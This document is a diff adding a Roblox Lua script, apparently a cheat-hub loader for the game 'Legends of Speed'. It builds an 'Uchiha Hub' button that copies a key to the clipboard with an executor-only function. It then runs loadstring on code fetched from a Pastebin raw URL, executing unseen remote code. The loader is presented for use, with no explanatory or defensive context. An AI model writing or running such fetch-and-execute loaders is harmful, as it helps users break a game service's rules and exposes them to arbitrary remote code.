@@ -1,0 +1,76 @@
+local function createButton(name, position)
+    local button = Instance.new("TextButton")
+    button.Name = name
+    button.Size = UDim2.new(0, 100, 0, 40)
+    button.Position = position
+    button.Text = name
+    button.Font = Enum.Font.SourceSansBold
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.TextSize = 14
+    button.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    button.BorderSizePixel = 0
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = button
+    
+    return button
+end
+
+local function legendsOfSpeedScript()
+    local player = game.Players.LocalPlayer
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "LegendsOfSpeedGUI"
+    gui.Parent = player.PlayerGui
+
+    local uchihaButton = createButton("Uchiha Hub", UDim2.new(0, 10, 0, 10))
+    uchihaButton.Parent = gui
+
+    local notificationLabel = Instance.new("TextLabel")
+    notificationLabel.Size = UDim2.new(0, 200, 0, 50)
+    notificationLabel.Position = UDim2.new(0.5, -100, 1, 0)
+    notificationLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+    notificationLabel.BackgroundTransparency = 0.5
+    notificationLabel.TextColor3 = Color3.new(1, 1, 1)
+    notificationLabel.Text = "Key copied"
+    notificationLabel.Font = Enum.Font.SourceSansBold
+    notificationLabel.TextSize = 18
+    notificationLabel.Visible = false
+    notificationLabel.Parent = gui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = notificationLabel
+
+    uchihaButton.MouseButton1Click:Connect(function()
+        setclipboard("SUBSCRIBERELZBLOX")
+
+        notificationLabel.Visible = true
+        notificationLabel:TweenPosition(
+            UDim2.new(0.5, -100, 0.9, 0),
+            Enum.EasingDirection.Out,
+            Enum.EasingStyle.Quad,
+            0.5,
+            true,
+            function()
+                wait(2)
+                notificationLabel:TweenPosition(
+                    UDim2.new(0.5, -100, 1, 0),
+                    Enum.EasingDirection.In,
+                    Enum.EasingStyle.Quad,
+                    0.5,
+                    true,
+                    function()
+                        notificationLabel.Visible = false
+                        gui:Destroy()
+                    end
+                )
+            end
+        )
+
+        loadstring(game:HttpGet("https://pastebin.com/raw/XN1XgGGM"))()
+        uchihaButton:Destroy()
+    end)
+end
+
+legendsOfSpeedScript()
